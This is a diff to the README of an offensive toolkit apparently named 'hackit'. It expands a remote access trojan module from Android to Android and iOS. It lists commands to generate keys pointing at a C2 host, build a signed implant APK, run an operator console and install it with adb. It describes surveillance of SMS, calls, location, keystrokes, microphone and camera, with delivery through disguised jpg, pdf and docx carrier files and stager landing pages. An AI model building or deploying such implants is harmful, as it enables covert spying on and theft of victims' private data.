@@ -1086,7 +1086,7 @@ Global flags: `--proxy URL`, `--no-verify`, `--no-banner`, `--verbose`, `--versi
 | `dirfinder` | Hidden directory and file discovery engine |
 | `ddos` | Authorized resilience testing — scoped, capped, audited (HTTP via Go, TCP via C) |
 | `wireless` | Interactive wireless auditing console |
-| `rat` | Android RAT bench: `doctor`, `keygen`, `build`, `serve`, `console`, `send`, `dump` |
+| `rat` | Android/iOS RAT bench — bare `rat` opens the menu: `make apk\|file\|stager\|ios`, `run`, `tunnel` |
 | `config` | Terminal theme, user, host, colors, prompt (15 themes) |
 | `examples` | Copy paste usage examples for every tool |
 | `help-tools` | Short quick reference of the most used tools |
@@ -1101,21 +1101,27 @@ Detect first with `scan`, enumerate with `tables` and `columns`,
 exfiltrate with `dump` or `extract`, escalate with `exec`, `priv`,
 `network`, and document with `report`.
 
-### Android RAT (`hackit rat`)
+### Android / iOS RAT bench (`hackit rat`)
 
-Encrypted Android implant (API 21–35) with a Python C2: SMS, calls, contacts,
-location, notifications, keylog, clipboard, files, mic, camera, screen, apps.
-Every payload is sealed with AES-256-GCM over an HKDF-derived PSK.
+Type `hackit rat` with no flags: banner, help, then an input loop —
+`make apk`, `make file <ext>`, `make stager`, `make ios`, `run`, `tunnel`.
+`run` opens a live operator UI that fills itself from the C2.
 
 ```bash
-hackit rat doctor                                  # JDK + SDK + build-tools
-hackit rat keygen --host https://c2.example.com    # PSK + agent.json
-hackit rat build --config ~/.hackit/rat/agent.json # signed APK
-hackit rat console                                 # C2 + operator shell
-adb install -r ~/.hackit/rat/build/<stamp>/agent-signed.apk
+hackit rat                       # interactive menu
+hackit rat doctor                # JDK + SDK + build-tools + NDK
+hackit rat keygen --host https://c2.example.com
+hackit rat build                 # signed APK + libhackit.so x3 ABIs
+hackit rat console               # C2 + operator shell
+hackit rat run                   # C2 + full-screen live UI
+adb install -r ~/.hackit/rat/dist/agent.apk
 ```
 
-Module details: `hackit/rat/README.md`.
+Five delivery paths land in one store: APK implant (Android 5.0–15), carrier
+files (jpg/png/webp/mp3/mp4/pdf/svg/docx), iOS WebClip + PWA web agent,
+native C++ UDP channel (ChaCha20-Poly1305, /proc probes, inotify), and
+installer stagers with a public landing page. Module details:
+`hackit/rat/README.md`.
 
 ### Common recipes
 
